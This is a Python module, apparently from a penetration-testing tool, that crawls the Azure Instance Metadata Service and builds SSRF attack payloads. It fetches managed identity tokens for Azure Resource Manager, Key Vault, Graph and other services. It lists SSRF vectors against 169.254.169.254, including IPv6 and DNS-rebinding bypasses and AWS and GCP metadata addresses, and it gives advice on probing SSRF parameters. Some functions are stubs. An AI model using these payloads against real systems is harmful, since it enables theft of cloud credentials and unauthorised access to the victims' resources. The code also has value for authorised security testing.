# app/core/imds_crawler.py
import urllib.request
import urllib.error
import json
import time
from typing import Dict, List, Optional, Any

class IMDSCrawler:
    """Azure Instance Metadata Service (IMDS) crawler and token fetcher"""
    
    def __init__(self):
        self.base_url = "http://169.254.169.254"
        self.headers = {"Metadata": "true"}
        self.timeout = 5
        
    def is_imds_accessible(self) -> bool:
        """Check if IMDS is accessible (always False from external application)"""
        return False
    
    def get_instance_metadata(self) -> Dict[str, Any]:
        """Get complete instance metadata"""
        try:
            req = urllib.request.Request(
                f"{self.base_url}/metadata/instance?api-version=2021-02-01",
                headers=self.headers
            )
            response = urllib.request.urlopen(req, timeout=self.timeout)
            return json.loads(response.read().decode())
        except Exception as e:
            return {"error": str(e)}
    
    def get_compute_metadata(self) -> Dict[str, Any]:
        """Get compute-specific metadata"""
        try:
            req = urllib.request.Request(
                f"{self.base_url}/metadata/instance/compute?api-version=2021-02-01",
                headers=self.headers
            )
            response = urllib.request.urlopen(req, timeout=self.timeout)
            return json.loads(response.read().decode())
        except Exception as e:
            return {"error": str(e)}
    
    def get_network_metadata(self) -> Dict[str, Any]:
        """Get network metadata"""
        try:
            req = urllib.request.Request(
                f"{self.base_url}/metadata/instance/network?api-version=2021-02-01",
                headers=self.headers
            )
            response = urllib.request.urlopen(req, timeout=self.timeout)
            return json.loads(response.read().decode())
        except Exception as e:
            return {"error": str(e)}
    
    def get_managed_identity_token(self, resource: str) -> Dict[str, Any]:
        """Get managed identity token for specific resource"""
        try:
            url = f"{self.base_url}/metadata/identity/oauth2/token?api-version=2018-02-01&resource={resource}"
            req = urllib.request.Request(url, headers=self.headers)
            response = urllib.request.urlopen(req, timeout=self.timeout)
            return json.loads(response.read().decode())
        except Exception as e:
            return {"error": str(e)}
    
    def enumerate_all_tokens(self) -> Dict[str, Any]:
        """Enumerate tokens for all common Azure resources"""
        resources = [
            "https://management.azure.com/",
            "https://vault.azure.net/",
            "https://storage.azure.com/",
            "https://graph.microsoft.com/",
            "https://database.windows.net/",
            "https://ossrdbms-aad.database.windows.net/",
            "https://analysis.windows.net/powerbi/api",
            "https://api.loganalytics.io/",
            "https://batch.core.windows.net/",
            "https://service.flow.microsoft.com/"
        ]
        
        tokens = {}
        for resource in resources:
            token_data = self.get_managed_identity_token(resource)
            if "error" not in token_data:
                tokens[resource] = {
                    "access_token": token_data.get("access_token", "")[:50] + "...",
                    "token_type": token_data.get("token_type"),
                    "expires_on": token_data.get("expires_on"),
                    "resource": token_data.get("resource")
                }
            else:
                tokens[resource] = {"error": token_data["error"]}
        
        return tokens
    
    def get_attested_data(self) -> Dict[str, Any]:
        """Get attested data (signed metadata)"""
        try:
            req = urllib.request.Request(
                f"{self.base_url}/metadata/attested/document?api-version=2020-09-01",
                headers=self.headers
            )
            response = urllib.request.urlopen(req, timeout=self.timeout)
            return json.loads(response.read().decode())
        except Exception as e:
            return {"error": str(e)}
    
    def get_scheduled_events(self) -> Dict[str, Any]:
        """Get scheduled events"""
        try:
            req = urllib.request.Request(
                f"{self.base_url}/metadata/scheduledevents?api-version=2020-07-01",
                headers=self.headers
            )
            response = urllib.request.urlopen(req, timeout=self.timeout)
            return json.loads(response.read().decode())
        except Exception as e:
            return {"error": str(e)}
    
    def simulate_imds_attack(self, target_url: str) -> Dict[str, Any]:
        """Simulate IMDS attack against target URL"""
        results = {
            "target": target_url,
            "imds_endpoints_tested": [],
            "ssrf_vectors": [],
            "potential_tokens": [],
            "summary": {}
        }
        
        # IMDS endpoints to test via SSRF
        imds_endpoints = [
            "/metadata/instance?api-version=2021-02-01",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/",
            "/metadata/attested/document?api-version=2020-09-01",
            "/metadata/scheduledevents?api-version=2020-07-01"
        ]
        
        # Test SSRF vectors
        ssrf_payloads = [
            "http://169.254.169.254",
            "http://metadata.google.internal",  # GCP
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://[::ffff:169.254.169.254]",  # IPv6
            "http://169.254.169.254.xip.io",
            "http://169.254.169.254.nip.io"
        ]
        
        for endpoint in imds_endpoints:
            for payload in ssrf_payloads:
                test_url = f"{payload}{endpoint}"
                results["imds_endpoints_tested"].append(test_url)
                
                # Test if target accepts SSRF payload
                if self.test_ssrf_vector(target_url, test_url):
                    results["ssrf_vectors"].append({
                        "payload": test_url,
                        "endpoint": endpoint,
                        "risk": "HIGH" if "token" in endpoint else "MEDIUM"
                    })
        
        # Generate token extraction payloads
        results["potential_tokens"] = self.generate_token_payloads()
        
        results["summary"] = self._generate_ssrf_summary(results)
        return results
    
    def test_ssrf_vector(self, target_url: str, ssrf_payload: str) -> bool:
        """Test SSRF vector against target (placeholder - would need actual implementation)"""
        # This would test common SSRF parameters like:
        # ?url=, ?redirect=, ?fetch=, ?proxy=, etc.
        return False  # Placeholder
    
    def generate_token_payloads(self) -> List[Dict[str, str]]:
        """Generate IMDS token extraction payloads"""
        resources = [
            "https://management.azure.com/",
            "https://vault.azure.net/",
            "https://graph.microsoft.com/",
            "https://storage.azure.com/",
            "https://database.windows.net/"
        ]
        
        payloads = []
        for resource in resources:
            payloads.append({
                "resource": resource,
                "payload": f"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource={resource}",
                "headers": "Metadata: true",
                "description": f"Extract managed identity token for {resource}"
            })
        
        return payloads
    
    def comprehensive_crawl(self) -> Dict[str, Any]:
        """Perform comprehensive IMDS crawl (external mode)"""
        results = {
            "accessible": False,  # Always false from external
            "instance_metadata": {},
            "compute_metadata": {},
            "network_metadata": {},
            "managed_identity_tokens": {},
            "attested_data": {},
            "scheduled_events": {},
            "ssrf_attack_vectors": self.generate_ssrf_attack_vectors(),
            "summary": {}
        }
        
        results["summary"] = {
            "status": "External IMDS attack simulation",
            "ssrf_vectors": len(results["ssrf_attack_vectors"]),
            "attack_description": "Use these payloads to test SSRF vulnerabilities for IMDS access"
        }
        
        return results
    
    def generate_ssrf_attack_vectors(self) -> List[Dict[str, str]]:
        """Generate SSRF attack vectors for IMDS"""
        vectors = [
            {
                "name": "Basic IMDS Instance Metadata",
                "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "headers": "Metadata: true",
                "description": "Extract VM instance metadata"
            },
            {
                "name": "ARM Management Token",
                "payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                "headers": "Metadata: true",
                "description": "Extract Azure Resource Manager token"
            },
            {
                "name": "Key Vault Token",
                "payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/",
                "headers": "Metadata: true",
                "description": "Extract Key Vault access token"
            },
            {
                "name": "Graph API Token",
                "payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/",
                "headers": "Metadata: true",
                "description": "Extract Microsoft Graph token"
            },
            {
                "name": "IPv6 Bypass",
                "payload": "http://[::ffff:169.254.169.254]/metadata/instance?api-version=2021-02-01",
                "headers": "Metadata: true",
                "description": "IPv6 bypass for IMDS access"
            },
            {
                "name": "DNS Rebinding",
                "payload": "http://169.254.169.254.xip.io/metadata/instance?api-version=2021-02-01",
                "headers": "Metadata: true",
                "description": "DNS rebinding attack vector"
            }
        ]
        
        return vectors
    
    def _generate_ssrf_summary(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate summary for SSRF-based IMDS attack"""
        summary = {
            "target": results.get("target"),
            "endpoints_tested": len(results.get("imds_endpoints_tested", [])),
            "ssrf_vectors_found": len(results.get("ssrf_vectors", [])),
            "token_payloads": len(results.get("potential_tokens", [])),
            "attack_success": len(results.get("ssrf_vectors", [])) > 0,
            "recommendations": [
                "Test SSRF vulnerabilities with IMDS payloads",
                "Use Burp Collaborator or similar for out-of-band testing",
                "Try different encoding methods (URL, double URL, etc.)",
                "Test various SSRF parameters (?url=, ?redirect=, ?fetch=)"
            ]
        }
        
        return summary
    
    def _generate_summary(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate summary of IMDS findings"""
        summary = {
            "status": "IMDS accessible",
            "vm_info": {},
            "token_count": 0,
            "high_value_tokens": [],
            "security_findings": []
        }
        
        # Extract VM info
        compute = results.get("compute_metadata", {})
        if "error" not in compute:
            summary["vm_info"] = {
                "name": compute.get("name"),
                "resourceGroupName": compute.get("resourceGroupName"),
                "subscriptionId": compute.get("subscriptionId"),
                "location": compute.get("location"),
                "vmSize": compute.get("vmSize")
            }
        
        # Count successful tokens
        tokens = results.get("managed_identity_tokens", {})
        successful_tokens = [r for r in tokens.keys() if "error" not in tokens[r]]
        summary["token_count"] = len(successful_tokens)
        
        # Identify high-value tokens
        high_value_resources = [
            "https://management.azure.com/",
            "https://vault.azure.net/",
            "https://graph.microsoft.com/"
        ]
        
        for resource in high_value_resources:
            if resource in successful_tokens:
                summary["high_value_tokens"].append(resource)
        
        # Security findings
        if summary["token_count"] > 0:
            summary["security_findings"].append(f"Managed identity tokens accessible ({summary['token_count']} resources)")
        
        if summary["high_value_tokens"]:
            summary["security_findings"].append("High-value tokens available (ARM, KeyVault, Graph)")
        
        return summary

# Global IMDS crawler instance
imds_crawler = IMDSCrawler()